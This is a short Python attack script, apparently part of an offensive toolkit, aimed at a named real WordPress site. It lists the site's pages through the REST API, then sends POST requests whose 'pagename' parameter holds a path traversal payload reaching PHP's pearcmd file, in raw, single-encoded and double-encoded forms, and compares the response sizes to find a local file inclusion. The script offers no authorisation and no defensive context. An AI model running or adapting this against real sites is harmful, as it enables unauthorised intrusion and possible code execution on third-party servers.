import json
from core import vuln, http

h = "mirk154.ru"
base = "https://" + h
CT = "application/x-www-form-urlencoded"

r = vuln._req("GET", base + "/wp-json/wp/v2/pages?per_page=5&_fields=id,slug,template")
pages = json.loads(r.text or "[]")
print("страницы:", pages)
pid = pages[0]["id"]; slug = pages[0]["slug"]
print("берём:", pid, slug)

def post(pname, raw=False):
    body = ("page_id=%d&pagename=%s" % (pid, pname if raw else vuln._denc(pname))).encode()
    return vuln._req("POST", base + "/", body=body, ctype=CT)

print("A pagename=slug:", len((post(slug, raw=True).text or "")))
print("B pagename=/slug/:", len((post("/" + slug + "/", raw=True).text or "")))
one = "page-templates/../../../../usr/local/lib/php/pearcmd"
enc1 = one.replace("/", "%2F").replace(".", "%2E")
print("C одинарное кодирование:", len((post(enc1, raw=True).text or "")))
print("D двойное кодирование:", len((post(one).text or "")))
print("E пустой pagename:", len((post("", raw=True).text or "")))